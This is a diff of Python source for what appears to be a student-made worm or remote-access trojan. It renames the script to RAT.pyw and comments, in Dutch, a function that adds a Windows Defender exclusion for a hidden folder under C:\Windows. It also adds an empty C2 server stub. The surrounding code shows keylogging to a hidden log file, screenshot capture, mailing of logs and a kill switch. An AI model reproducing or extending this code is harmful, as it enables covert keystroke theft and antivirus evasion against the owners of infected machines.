@@ -19,7 +19,7 @@ now = datetime.now()
 dateTimeFull = now.strftime("%d/%m/%Y, %H:%M:%S")
 dateTimeFolder = now.strftime("%d.%m.%Y_%H.%M.%S")
 dateTimeDay = now.strftime("%d-%m-%Y")
-scriptPath = os.path.abspath("C:\\Windows\\s142486_WormFolder\\Worm.pyw")
+scriptPath = os.path.abspath("C:\\Windows\\s142486_WormFolder\\RAT.pyw")
 hiddenFolderPath = os.path.expanduser("C:\\Windows\\s142486_WormFolder")
 path = f"C:\\Windows\\s142486_WormFolder\\Logs_{dateTimeFolder}\\keylog.txt"
 logs = "C:\\Windows\\s142486_WormFolder" 
@@ -85,6 +85,7 @@ def loadParams():
 
 timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch, persistentMailInterval = loadParams()
 
+# Voegt de verborgen folder toe aan de Windows Defender uitsluitingen
 def add_defender_exclusion():
     try:
         subprocess.run(
@@ -315,6 +316,10 @@ def keyLogger():
                     dataFile.write(f"Error: {e}\n")
                     dataFile.flush()
                     break
+
+# C2 server functie (niet geïmplementeerd, placeholder)
+def c2Server():
+    pass
 
 # Killswitch functie
 def killSwitch():
